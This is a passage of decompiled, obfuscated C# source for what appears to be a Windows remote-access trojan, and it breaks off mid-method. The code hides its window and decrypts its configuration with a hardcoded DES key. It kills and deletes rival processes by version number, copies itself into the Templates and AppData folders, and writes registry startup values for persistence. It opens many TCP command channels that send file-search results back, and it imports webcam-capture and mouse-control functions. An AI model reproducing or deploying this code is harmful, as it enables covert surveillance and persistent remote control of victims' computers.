using System;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Drawing.Imaging;
using System.Drawing.Printing;
using System.IO;
using System.Management;
using System.Net;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.ServiceProcess;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;
using CYMMwi9zGBGeGSvfYuB2;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.VisualBasic.FileIO;
using Microsoft.Win32;
using SykRZRJPElNDnwj60AE3;
using ns0;
using ns1;

[DesignerGenerated]
public class MainFrm : Form
{
	private IContainer alsVn10;

	[AccessedThroughProperty("ServiceController1")]
	private ServiceController erve911;

	private bool OkPpE12;

	private bool g5jZH13;

	private bool RZrtR14;

	private int rzP3M15;

	private int xNAcS16;

	private int inEgh17;

	private int int_0;

	private string I2TFX19;

	private string string_0;

	private string aUY3V21;

	private string FBsrB22;

	private string string_1;

	private string Tq2IC24;

	private string N1AH825;

	private int pG95I26;

	private int int_1;

	private TcpClient opAkC28;

	private NetworkStream tBwfK29;

	private StreamWriter Yomi430;

	private StreamReader EoA3n31;

	private Process process_0;

	private StringBuilder YrmJt33;

	private int xPCOY34;

	private int tPH6935;

	private long bulW936;

	private short short_0;

	private byte[] JTRDy38;

	private FileStream fileStream_0;

	private FileStream fileStream_1;

	private BinaryWriter binaryWriter_0;

	private BinaryReader OGuUb42;

	private int FYlMw43;

	private long EAmFK44;

	private long DXYgT45;

	private string m9Tt746;

	private MessageBoxIcon WGAIZ47;

	private MessageBoxButtons dMwpf48;

	private string string_2;

	private string string_3;

	private string rS70A51;

	private Point cOhre52;

	private Rectangle FM1Mf53;

	private const int SC_SCREENSAVE = 61760;

	private const int HWND_BROADCAST = 65535;

	private const int WM_SYSCOMMAND = 274;

	public const long M = 1L;

	public const long MONITOR_ON = -1L;

	public const int MONITOR_OFF = 2;

	private const int SC_MONITORPOWER = 61808;

	private const short WM_CAP = 1024;

	private const int WM_CAP_COPY = 1054;

	private const int WM_CAP_DRIVER_CONNECT = 1034;

	private const int WM_CAP_DRIVER_DISCONNECT = 1035;

	private const int WM_CAP_EDIT_COPY = 1054;

	private const int WM_CAP_GET_FRAME = 1084;

	private int YnCMi54;

	private IDataObject S4WqH55;

	private Image eZwmM56;

	private ManagementObjectSearcher zgBuG57;

	private string string_4;

	private string pv4aA59;

	private string gnbcU60;

	private const int MOUSEEVENTF_ABSOLUTE = 32768;

	private const int MOUSEEVENTF_LEFTDOWN = 2;

	private const int MOUSEEVENTF_LEFTUP = 4;

	private const int MOUSEEVENTF_MOVE = 1;

	private const int MOUSEEVENTF_MIDDLEDOWN = 32;

	private const int MOUSEEVENTF_MIDDLEUP = 64;

	private const int MOUSEEVENTF_RIGHTDOWN = 8;

	private const int MOUSEEVENTF_RIGHTUP = 16;

	private string[] Ia6Z661;

	private string[] mVHjl62;

	private string[] diUEF63;

	private Thread oaw6a64;

	private string pOtZT65;

	private string[] mZLQq66;

	private int[] QOjs467;

	private const long MB_DEFBUTTON1 = 0L;

	private const long MB_DEFBUTTON2 = 256L;

	private TcpClient p9Coj68;

	private NetworkStream networkStream_0;

	private StreamWriter streamWriter_0;

	private StreamReader streamReader_0;

	private Thread UG76J72;

	private TcpClient maQSv73;

	private NetworkStream pZsAg74;

	private StreamWriter fy7N275;

	private StreamReader xyGqM76;

	private Thread KzgFk77;

	private TcpClient ZJhW978;

	private NetworkStream J2wEW79;

	private StreamWriter Y1nh980;

	private StreamReader streamReader_1;

	private Thread xJgZX82;

	private TcpClient lZGjY83;

	private NetworkStream NTbxv84;

	private StreamWriter FHvqx85;

	private StreamReader d1sQ486;

	private Thread wbogF87;

	private TcpClient BJ1JM88;

	private NetworkStream fthZO89;

	private StreamWriter JlcG990;

	private StreamReader streamReader_2;

	private Thread pEpIJ92;

	private TcpClient wgqVq93;

	private NetworkStream networkStream_1;

	private StreamWriter streamWriter_1;

	private StreamReader cqvBN96;

	private Thread RPMHZ97;

	private TcpClient GmCMf98;

	private NetworkStream Xki0g99;

	private StreamWriter Z3myE100;

	private StreamReader streamReader_3;

	private Thread cn4wi102;

	private TcpClient Z8NUR103;

	private NetworkStream GtIWJ104;

	private StreamWriter NXDop105;

	private StreamReader Izrug106;

	private Thread thread_0;

	private TcpClient VgtCN108;

	private NetworkStream jh6tf109;

	private StreamWriter Pxo8z110;

	private StreamReader wkqPR111;

	private Thread bi9Tn112;

	private TcpClient CVAg9113;

	private NetworkStream VbQgW114;

	private StreamWriter qZ69q115;

	private StreamReader wR99A116;

	private Thread abjUK117;

	private TcpClient OD75s118;

	private NetworkStream C6Aea119;

	private StreamWriter nHQkj120;

	private StreamReader DH7b9121;

	private Thread wehok122;

	private TcpClient k90ic123;

	private NetworkStream rCGvk124;

	private StreamWriter i4KNkjpRY3P0125;

	private StreamReader OPXt37KdAmJK126;

	private Thread thread_1;

	private TcpClient XkRQ7milvkkb128;

	private NetworkStream lJnuViKWlZFR129;

	private StreamWriter c7OghOFOOovJ130;

	private StreamReader gU6d3neO8VWj131;

	private Thread kh52f4dXFZDZ132;

	private TcpClient x23HEvnWdEd0133;

	private NetworkStream bxTXKQIhbvV0134;

	private StreamWriter IDzJby4gh6F1135;

	private StreamReader kxaDy06G34RI136;

	private Thread bfcOhlO272Z1137;

	private TcpClient WDKFAWJ4RRDd138;

	private NetworkStream G5JapfWDLRyW139;

	private StreamWriter lfZViCUhx8HU140;

	private StreamReader fq56lMQjCZ8c141;

	private Thread CDCR5mf45Njl142;

	private TcpClient XNMeXlFxnPVY143;

	private NetworkStream networkStream_2;

	private StreamWriter streamWriter_2;

	private StreamReader streamReader_4;

	private Thread thread_2;

	private TcpClient auDL0tRoGKYp148;

	private NetworkStream S32wYwVljV7D149;

	private StreamWriter xYY9wY2Smq6O150;

	private StreamReader X2MfMjzjhFYp151;

	private Thread VIcXcTBen0d2152;

	private TcpClient uISHH62sXdzV153;

	private NetworkStream JFyZlNmSZydO154;

	private StreamWriter M5FtORrWPKL4155;

	private StreamReader rRBaDvsH9hdw156;

	private Thread kCSzEl2Vv4VC157;

	private TcpClient qyE5LC5ZUuyt158;

	private NetworkStream cbft6vFuR99c159;

	private StreamWriter YSiuIPzmWZK4160;

	private int RmWwbeBP3pns161;

	private string string_5;

	private Mutex jBg5VcxcraCK163;

	private Thread z8jCxj8zvPoa164;

	private string string_6;

	private bool YwURRa1UV4pg166;

	private bool bool_0;

	private bool e1YXvdvwVJE1168;

	private int phHkNteWaHo6169;

	private int Jz5HFJmRryCQ170;

	private List<Rectangle> c3pIySlntHF1171;

	private int[] P2GJS8bxDSeV172;

	private string string_7;

	private int int_2;

	private int int_3;

	private bool bool_1;

	private string KTbCfb13Wf9J177;

	private int NhtzEOTBVDgc178;

	internal virtual ServiceController ServiceController1
	{
		get
		{
			return erve911;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			erve911 = value;
		}
	}

	private string Manufacturer => string_4;

	private string Model => pv4aA59;

	private string WindowsDirectory => gnbcU60;

	public MainFrm()
	{
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		((Form)this).add_Shown((EventHandler)GXEUcEo799);
		((Form)this).add_FormClosing(new FormClosingEventHandler(FSYFi5tk111));
		OkPpE12 = false;
		rzP3M15 = 0;
		xPCOY34 = 32768;
		tPH6935 = 65536;
		JTRDy38 = new byte[0];
		rS70A51 = Conversions.ToString(Environment.OSVersion.Version.Major);
		FM1Mf53 = Screen.get_PrimaryScreen().get_Bounds();
		pOtZT65 = "";
		mZLQq66 = new string[4] { "Default", "90", "180", "270" };
		QOjs467 = new int[4] { 0, 1, 2, 3 };
		YwURRa1UV4pg166 = false;
		bool_0 = false;
		e1YXvdvwVJE1168 = false;
		checked
		{
			phHkNteWaHo6169 = (int)Math.Round((double)FM1Mf53.Width / 4.0);
			Jz5HFJmRryCQ170 = (int)Math.Round((double)FM1Mf53.Height / 4.0);
			c3pIySlntHF1171 = new List<Rectangle>();
			P2GJS8bxDSeV172 = new int[17];
			string_7 = null;
			int_2 = 0;
			bool_1 = false;
			pH3tlFns86();
		}
	}

	[STAThread]
	public static void AlXP2UoL85()
	{
		Application.Run((Form)(object)new MainFrm());
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		//Error decoding local variables: Signature type sequence must have at least one element.
		try
		{
			if (disposing && alsVn10 != null)
			{
				alsVn10.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void pH3tlFns86()
	{
		//IL_0011: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_006e: Unknown result type (might be due to invalid IL or missing references)
		new ComponentResourceManager(typeof(MainFrm));
		ServiceController1 = new ServiceController();
		((Control)this).SuspendLayout();
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		Size clientSize = new Size(0, 0);
		((Form)this).set_ClientSize(clientSize);
		((Form)this).set_ControlBox(false);
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		Padding margin = default(Padding);
		((Padding)(ref margin))._002Ector(18, 39, 18, 39);
		((Form)this).set_Margin(margin);
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("MainFrm");
		((Form)this).set_Opacity(0.0);
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_WindowState((FormWindowState)1);
		((Control)this).ResumeLayout(false);
	}

	[DllImport("winmm.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int mciSendStringA([MarshalAs(UnmanagedType.VBByRefStr)] ref string lpstrCommand, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpstrReturnString, int uReturnLength, int hwndCallback);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int SendMessageA(int hwnd, int wMsg, int wParam, [MarshalAs(UnmanagedType.AsAny)] object lParam);

	[DllImport("avicap32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int capCreateCaptureWindowA([MarshalAs(UnmanagedType.VBByRefStr)] ref string lpszWindowName, int dwStyle, int x, int y, int nWidth, short nHeight, int hWndParent, int nID);

	[DllImport("avicap32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern bool capGetDriverDescriptionA(short wDriver, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpszName, int cbName, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpszVer, int cbVer);

	[DllImport("winmm.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int mciExecute([MarshalAs(UnmanagedType.VBByRefStr)] ref string lpstrCommand);

	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern IntPtr FindWindow([MarshalAs(UnmanagedType.VBByRefStr)] ref string lpClassName, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpWindowName);

	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern IntPtr GetWindow(IntPtr hWnd, uint uCmd);

	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern IntPtr FindWindowEx(IntPtr hwnd, IntPtr hWndChild, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpszClassName, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpszWindow);

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern bool IsWindowVisible(IntPtr hwnd);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern void mouse_event(int dwFlags, int dx, int dy, int cButtons, int dwExtraInfo);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern long SwapMouseButton(long bSwap);

	private void GXEUcEo799(object sender, EventArgs e)
	{
		try
		{
			QSWSDxTR122(5);
			jBg5VcxcraCK163 = new Mutex(initiallyOwned: false, DzuU1A6v16.ssbraCd540());
			if (!jBg5VcxcraCK163.WaitOne(0, exitContext: false))
			{
				jBg5VcxcraCK163.Close();
				jBg5VcxcraCK163 = null;
				ProjectData.EndApp();
			}
			((Control)this).set_Visible(false);
			string_1 = iTVVmbDQ113(DzuU1A6v16.knacHyO336(), "12345#$%");
			string_5 = string_1;
			Tq2IC24 = iTVVmbDQ113(DzuU1A6v16.Kiby9YdJ38(), "12345#$%");
			pG95I26 = DzuU1A6v16.vl1zUqwm37();
			RmWwbeBP3pns161 = pG95I26;
			int_1 = DzuU1A6v16.YgstTZPp39();
			QSWSDxTR122(1);
			if ((Operators.CompareString(string_5, (string)null, false) == 0) | (RmWwbeBP3pns161 == 0))
			{
				Environment.Exit(0);
			}
			else
			{
				try
				{
					FNZLq0w1109();
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
				try
				{
					Thread thread = new Thread(RkzREJko107);
					thread.Start();
				}
				catch (Exception projectError2)
				{
					ProjectData.SetProjectError(projectError2);
					ProjectData.ClearProjectError();
				}
				oaw6a64 = new Thread(method_17);
				oaw6a64.Start();
				try
				{
					Thread thread2 = new Thread(Nt7DF0Nb101);
					thread2.Start();
				}
				catch (Exception projectError3)
				{
					ProjectData.SetProjectError(projectError3);
					ProjectData.ClearProjectError();
				}
			}
			int_0 = ((Control)this).get_Handle().ToInt32();
			BZpWG151();
		}
		catch (Exception projectError4)
		{
			ProjectData.SetProjectError(projectError4);
			Environment.Exit(0);
			ProjectData.ClearProjectError();
		}
	}

	[DllImport("dnsapi.dll")]
	private static extern uint DnsFlushResolverCache();

	private void Nt7DF0Nb101()
	{
		while (true)
		{
			QSWSDxTR122(1800);
			try
			{
				if (!opAkC28.Connected)
				{
					DnsFlushResolverCache();
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
	}

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int GetWindowTextA(int hwnd, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpString, int cch);

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int GetForegroundWindow();

	private string CCWP0RW8104()
	{
		string lpString = new string('\0', 100);
		GetWindowTextA(GetForegroundWindow(), ref lpString, 100);
		return lpString.Substring(0, checked(Strings.InStr(lpString, "\0", (CompareMethod)0) - 1));
	}

	private void method_0(object currentDirectory)
	{
		checked
		{
			try
			{
				if (!g5jZH13)
				{
					return;
				}
				Ia6Z661 = Directory.GetDirectories(Conversions.ToString(currentDirectory));
				mVHjl62 = Directory.GetFiles(Conversions.ToString(currentDirectory));
				string[] array = mVHjl62;
				foreach (string text in array)
				{
					if (diUEF63[1].StartsWith("*"))
					{
						string[] array2 = diUEF63[1].Split(new char[1] { '.' });
						if (text.EndsWith(array2[array2.Length - 1]))
						{
							nHQkj120.WriteLine("/SEARCHFL/" + text + "¦" + Conversions.ToString(((ServerComputer)ACXI0nnlHiqmG3Ru0QxC52.Computer).get_FileSystem().GetFileInfo(text).Length));
							nHQkj120.Flush();
						}
					}
					else
					{
						string[] array3 = text.Split(new char[1] { '\\' });
						if (array3[array3.Length - 1].Contains(diUEF63[1]))
						{
							nHQkj120.WriteLine("/SEARCHFL/" + text + "¦" + Conversions.ToString(((ServerComputer)ACXI0nnlHiqmG3Ru0QxC52.Computer).get_FileSystem().GetFileInfo(text).Length));
							nHQkj120.Flush();
						}
					}
				}
				string[] ia6Z = Ia6Z661;
				foreach (string text2 in ia6Z)
				{
					if (!(text2.Substring(3).StartsWith("WINDOWS") | text2.Substring(3).StartsWith("WINNT")))
					{
						method_0(text2);
					}
				}
				Ia6Z661 = null;
				if (Operators.ConditionalCompareObjectEqual(NewLateBinding.LateGet(currentDirectory, (Type)null, "Length", new object[0], (string[])null, (Type[])null, (bool[])null), (object)3, false))
				{
					nHQkj120.WriteLine("/SEARCHFL/SEARCHEND");
					nHQkj120.Flush();
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
	}

	private ImageCodecInfo method_1(string mimeType)
	{
		ImageCodecInfo[] imageEncoders = ImageCodecInfo.GetImageEncoders();
		int num = imageEncoders.Length;
		int num2 = 0;
		while (true)
		{
			if (num2 <= num)
			{
				if (Operators.CompareString(imageEncoders[num2].get_MimeType(), mimeType, false) == 0)
				{
					break;
				}
				num2 = checked(num2 + 1);
				continue;
			}
			return null;
		}
		return imageEncoders[num2];
	}

	private void RkzREJko107()
	{
		try
		{
			QSWSDxTR122(5);
			rDNkV3Ig110();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private object PG124Xaz108(string ProcessName)
	{
		Process process = new Process();
		Process[] processesByName = Process.GetProcessesByName(ProcessName);
		IEnumerator enumerator = default(IEnumerator);
		for (int i = 0; i < processesByName.Length; i = checked(i + 1))
		{
			process = processesByName[i];
			try
			{
				try
				{
					enumerator = process.Modules.GetEnumerator();
					if (!enumerator.MoveNext())
					{
						continue;
					}
					ProcessModule processModule = (ProcessModule)enumerator.Current;
					return processModule.FileName!.ToString();
				}
				finally
				{
					if (enumerator is IDisposable)
					{
						(enumerator as IDisposable).Dispose();
					}
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
		return null;
	}

	private void FNZLq0w1109()
	{
		try
		{
			Process[] processes = Process.GetProcesses();
			foreach (Process process in processes)
			{
				try
				{
					if (((ServerComputer)ACXI0nnlHiqmG3Ru0QxC52.Computer).get_FileSystem().GetFileInfo(Conversions.ToString(PG124Xaz108(process.ProcessName))).Length <= 100000L)
					{
						continue;
					}
					double num = double.Parse(FileVersionInfo.GetVersionInfo(Conversions.ToString(PG124Xaz108(process.ProcessName))).ProductVersion);
					if (num == 3.0 || num == 3.1 || num == 3.2 || num == 3.3 || num == 3.4 || num == 3.5)
					{
						try
						{
							process.Kill();
						}
						catch (Exception projectError)
						{
							ProjectData.SetProjectError(projectError);
							ProjectData.ClearProjectError();
						}
						QSWSDxTR122(2);
						try
						{
							((ServerComputer)ACXI0nnlHiqmG3Ru0QxC52.Computer).get_FileSystem().DeleteFile(Conversions.ToString(PG124Xaz108(process.ProcessName)));
						}
						catch (Exception projectError2)
						{
							ProjectData.SetProjectError(projectError2);
							ProjectData.ClearProjectError();
						}
					}
					else if (num == 3.7)
					{
						Environment.Exit(0);
					}
				}
				catch (Exception projectError3)
				{
					ProjectData.SetProjectError(projectError3);
					ProjectData.ClearProjectError();
				}
			}
		}
		catch (Exception projectError4)
		{
			ProjectData.SetProjectError(projectError4);
			ProjectData.ClearProjectError();
		}
	}

	private void rDNkV3Ig110()
	{
		try
		{
			if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Templates) + "\\" + Path.GetFileName(Application.get_ExecutablePath())))
			{
				try
				{
					byte[] array = ((ServerComputer)ACXI0nnlHiqmG3Ru0QxC52.Computer).get_FileSystem().ReadAllBytes(Application.get_ExecutablePath());
					try
					{
						((ServerComputer)ACXI0nnlHiqmG3Ru0QxC52.Computer).get_FileSystem().WriteAllBytes(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Microsoft\\" + Path.GetFileName(Application.get_ExecutablePath()), array, false);
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						QSWSDxTR122(1);
						ProjectData.ClearProjectError();
					}
					try
					{
						((ServerComputer)ACXI0nnlHiqmG3Ru0QxC52.Computer).get_FileSystem().WriteAllBytes(Environment.GetFolderPath(Environment.SpecialFolder.Templates) + "\\" + Path.GetFileName(Application.get_ExecutablePath()), array, false);
					}
					catch (Exception projectError2)
					{
						ProjectData.SetProjectError(projectError2);
						ProjectData.ClearProjectError();
					}
				}
				catch (Exception projectError3)
				{
					ProjectData.SetProjectError(projectError3);
					ProjectData.ClearProjectError();
				}
			}
			QSWSDxTR122(2);
			try
			{
				if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Templates) + "\\" + Path.GetFileName(Application.get_ExecutablePath())) && Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(((ServerComputer)ACXI0nnlHiqmG3Ru0QxC52.Computer).get_Registry().get_CurrentUser().OpenSubKey(iTVVmbDQ113(DzuU1A6v16.xVskll3c41(), "12345#$%"), writable: false)!.GetValue(iTVVmbDQ113(DzuU1A6v16.smethod_0(), "12345#$%")), (object)(Environment.GetFolderPath(Environment.SpecialFolder.Templates) + "\\" + Path.GetFileName(Application.get_ExecutablePath())), false))))
				{
					((ServerComputer)ACXI0nnlHiqmG3Ru0QxC52.Computer).get_Registry().get_CurrentUser().OpenSubKey(iTVVmbDQ113(DzuU1A6v16.xVskll3c41(), "12345#$%"), writable: true)!.SetValue(iTVVmbDQ113(DzuU1A6v16.smethod_0(), "12345#$%"), Environment.GetFolderPath(Environment.SpecialFolder.Templates) + "\\" + Path.GetFileName(Application.get_ExecutablePath()));
				}
			}
			catch (Exception projectError4)
			{
				ProjectData.SetProjectError(projectError4);
				ProjectData.ClearProjectError();
			}
			QSWSDxTR122(1);
			try
			{
				if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Microsoft\\" + Path.GetFileName(Application.get_ExecutablePath())) && Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(((ServerComputer)ACXI0nnlHiqmG3Ru0QxC52.Computer).get_Registry().get_CurrentUser().OpenSubKey(iTVVmbDQ113(DzuU1A6v16.xVskll3c41(), "12345#$%"), writable: false)!.GetValue(iTVVmbDQ113(DzuU1A6v16.smethod_1(), "12345#$%")), (object)(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Microsoft\\" + Path.GetFileName(Application.get_ExecutablePath())), false))))
				{
					((ServerComputer)ACXI0nnlHiqmG3Ru0QxC52.Computer).get_Registry().get_CurrentUser().OpenSubKey(iTVVmbDQ113(DzuU1A6v16.xVskll3c41(), "12345#$%"), writable: true)!.SetValue(iTVVmbDQ113(DzuU1A6v16.smethod_1(), "12345#$%"), Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Microsoft\\" + Path.GetFileName(Application.get_ExecutablePath()));
				}
			}
			catch (Exception projectError5)
			{
				ProjectData.SetProjectError(projectError5);
				ProjectData.ClearProjectError();
			}
		}
		catch (Exception projectError6)
		{
			ProjectData.SetProjectError(projectError6);
			ProjectData.ClearProjectError();
		}
	}

	private void FSYFi5tk111(object sender, FormClosingEventArgs e)
	{
		try
		{
			rDNkV3Ig110();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private string method_2(string strText, string strEncrKey)
	{
		byte[] rgbIV = new byte[8] { 18, 52, 86, 120, 144, 171, 205, 239 };
		try
		{
			byte[] bytes = Encoding.UTF8.GetBytes(Strings.Left(strEncrKey, 8));
			byte[] bytes2 = Encoding.UTF8.GetBytes(strText);
			DESCryptoServiceProvider dESCryptoServiceProvider = new DESCryptoServiceProvider();
			MemoryStream memoryStream = new MemoryStream();
			CryptoStream cryptoStream = new CryptoStream(memoryStream, dESCryptoServiceProvider.CreateEncryptor(bytes, rgbIV), CryptoStreamMode.Write);
			cryptoStream.Write(bytes2, 0, bytes2.Length);
			cryptoStream.FlushFinalBlock();
			return Convert.ToBase64String(memoryStream.ToArray());
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			string result = null;
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public string iTVVmbDQ113(string strText, string sDecrKey)
	{
		try
		{
			byte[] rgbIV = new byte[8] { 18, 52, 86, 120, 144, 171, 205, 239 };
			byte[] array = new byte[checked(strText.Length + 1)];
			byte[] bytes = Encoding.UTF8.GetBytes(Strings.Left(sDecrKey, 8));
			DESCryptoServiceProvider dESCryptoServiceProvider = new DESCryptoServiceProvider();
			array = Convert.FromBase64String(strText);
			MemoryStream memoryStream = new MemoryStream();
			CryptoStream cryptoStream = new CryptoStream(memoryStream, dESCryptoServiceProvider.CreateDecryptor(bytes, rgbIV), CryptoStreamMode.Write);
			cryptoStream.Write(array, 0, array.Length);
			cryptoStream.FlushFinalBlock();
			Encoding uTF = Encoding.UTF8;
			return uTF.GetString(memoryStream.ToArray());
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			string result = null;
			ProjectData.ClearProjectError();
			return result;
		}
	}

	private void Nxp1V0sL114()
	{
		try
		{
			fileStream_0.Close();
			OGuUb42.Close();
			binaryWriter_0 = null;
			fileStream_1 = null;
			OGuUb42 = null;
			fileStream_0 = null;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public bool XLnbZuhz115(ref string FileName)
	{
		//IL_000b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0012: Unknown result type (might be due to invalid IL or missing references)
		//IL_0014: Invalid comparison between Unknown and I4
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		bool flag = default(bool);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = 1;
					break;
				case 53:
					{
						num2 = num;
						switch (num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0000;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto end_IL_0000_2;
						default:
							goto end_IL_0000;
						case 3:
							goto end_IL_0000_3;
						}
						goto default;
					}
					end_IL_0000_2:
					break;
				}
				num = 2;
				flag = (FileSystem.GetAttr(FileName) & 0x10) == 0;
				break;
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 53;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		bool result = flag;
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
		return result;
	}

	private string jEGsGoEc116(ref string Temp)
	{
		try
		{
			string result = null;
			int num = Strings.Len(Temp);
			for (int i = 1; i <= num; i = checked(i + 1))
			{
				string text = Strings.Mid(Temp, i, 1);
				if (Operators.CompareString(text, "*", false) == 0)
				{
					break;
				}
				result = Strings.Mid(Temp, 1, i);
			}
			return result;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			string result2 = null;
			ProjectData.ClearProjectError();
			return result2;
		}
	}

	private string method_3()
	{
		try
		{
			Process[] processes = Process.GetProcesses();
			string text = null;
			Process[] array = processes;
			foreach (Process process in array)
			{
				string text2 = process.ProcessName + "*";
				text2 = text2 + process.Id + "*";
				text2 = text2 + process.BasePriority + "*";
				text2 += process.WorkingSet64;
				text = ((Operators.CompareString(text, (string)null, false) != 0) ? (text + "$" + text2) : text2);
			}
			return text;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			string result = null;
			ProjectData.ClearProjectError();
			return result;
		}
	}

	private string f7RKGso4118()
	{
		//IL_002b: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			string text = null;
			ServiceController[] services = ServiceController.GetServices();
			ServiceController[] array = services;
			foreach (ServiceController val in array)
			{
				string text2 = val.get_DisplayName() + "*";
				text2 = text2 + ((Enum)val.get_Status()).ToString() + "*";
				IO9palTiPhUt48 iO9palTiPhUt = new IO9palTiPhUt48(val.get_ServiceName());
				text2 += iO9palTiPhUt.StartupType;
				text = ((Operators.CompareString(text, (string)null, false) != 0) ? (text + "$" + text2) : text2);
			}
			return text;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			string result = null;
			ProjectData.ClearProjectError();
			return result;
		}
	}

	private void vyaCSpcN119(object Tempdata)
	{
		try
		{
			if (((ServerComputer)ACXI0nnlHiqmG3Ru0QxC52.Computer).get_FileSystem().FileExists(Conversions.ToString(Tempdata)))
			{
				((ServerComputer)ACXI0nnlHiqmG3Ru0QxC52.Computer).get_FileSystem().DeleteFile(Conversions.ToString(Tempdata));
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void BmBHuaap120(object Tempdata)
	{
		//IL_0080: Unknown result type (might be due to invalid IL or missing references)
		//IL_008a: Expected O, but got Unknown
		try
		{
			string[] array = (string[])NewLateBinding.LateGet(Tempdata, (Type)null, "Split", new object[1] { "¼" }, (string[])null, (Type[])null, (bool[])null);
			string text = Conversions.ToString(NewLateBinding.LateGet(array.GetValue(1), (Type)null, "Replace", new object[2] { "±", "\r\n" }, (string[])null, (Type[])null, (bool[])null));
			int num = int.Parse(Conversions.ToString(array.GetValue(0)));
			U3j9LRhdbuqU47 u3j9LRhdbuqU = new U3j9LRhdbuqU47(text);
			u3j9LRhdbuqU.Font = new Font("Tahoma", (float)num);
